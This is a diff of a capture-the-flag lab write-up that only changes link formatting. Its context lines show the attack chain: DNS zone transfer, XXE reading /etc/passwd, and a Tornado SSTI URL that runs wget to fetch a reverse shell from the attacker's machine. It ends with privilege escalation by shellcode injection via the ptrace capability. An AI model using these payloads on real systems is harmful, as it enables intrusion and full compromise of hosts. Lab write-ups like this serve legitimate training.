@@ -73,7 +73,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 - let's add it to our host file and then recheck the web!
 
 ## DNS Zone Transferring
-👉**[For Reference](https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns#zone-transfer)**👈
+👉[**For Reference**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns#zone-transfer)👈
 
 - Let's check the other records present on the Target DNS:
 
@@ -105,7 +105,7 @@ dig axfr @192.168.29.248 blackhat.local
 - It's using XML, so we could try with some XXE stuff here!
 
 ### Trying XML External Entity
-👉**[For Reference](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#read-file)**👈
+👉[**For Reference**](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#read-file)👈
 
 - Let's try to read the **/etc/passwd** file first:
 ![img10](screenshots/img10.png)
@@ -165,7 +165,7 @@ dig axfr @192.168.29.248 blackhat.local
 ![img19](screenshots/img19.png)
 
 - From a random command the page generated the error and it revealed that **tornady.py** is running here.
-👉**[Tornado SSTI](https://ajinabraham.com/blog/server-side-template-injection-in-tornado)**👈
+👉[**Tornado SSTI**](https://ajinabraham.com/blog/server-side-template-injection-in-tornado)👈
 
 - Let's try to fetch the current username first:
 
@@ -176,7 +176,7 @@ dig axfr @192.168.29.248 blackhat.local
 ## Initial Foothold
 
 - Now we will create a reverse shell and download it in the target machine through SSTI.
-👉**[for creating reverse shell](https://www.revshells.com/)**👈
+👉[**for creating reverse shell**](https://www.revshells.com/)👈
 
 - **URL**:
 
@@ -194,7 +194,7 @@ http://192.168.29.248:9999/?name={%%20import%20os%20%}{{%20os.popen(%22wget%20ht
 
 ![img23](screenshots/img23.png)
 
-👉**[Upgrading out shell](https://gabb4r.gitbook.io/oscp-notes/shell/upgrading-shell)**👈
+👉[**Upgrading out shell**](https://gabb4r.gitbook.io/oscp-notes/shell/upgrading-shell)👈
 
 ### Target Enumeration
 - First we've done the manual enumeration by checking:
@@ -206,11 +206,11 @@ http://192.168.29.248:9999/?name={%%20import%20os%20%}{{%20os.popen(%22wget%20ht
 
 ### Privilege Escalation
 
-👉**[resource](https://blog.pentesteracademy.com/privilege-escalation-by-abusing-sys-ptrace-linux-capability-f6e6ad2a59cc)**👈
+👉[**resource**](https://blog.pentesteracademy.com/privilege-escalation-by-abusing-sys-ptrace-linux-capability-f6e6ad2a59cc)👈
 
 - I found a blog that help me to understand to conduct privilege escalation from this linux capability.
 	- On the target we need to inject a shellcode through python2.7, cause this exactly we saw in our linpeas output.
-	- From the blog we found a c program o inject shellcode on the target machine, and we only have to rewrite the whole script into python; 👉**[link to the script in python](https://gitlab.com/oreximus/zeroseven/-/blob/master/PentestResources/LinuxCapPrivesc/inject.py)**👈
+	- From the blog we found a c program o inject shellcode on the target machine, and we only have to rewrite the whole script into python; 👉[**link to the script in python**](https://gitlab.com/oreximus/zeroseven/-/blob/master/PentestResources/LinuxCapPrivesc/inject.py)👈
 	- start a python server on your local computer and then transfer the script to the target's machine.
 	- we also need a process that is up and running with **root** privileges, for that check the processes by:
 
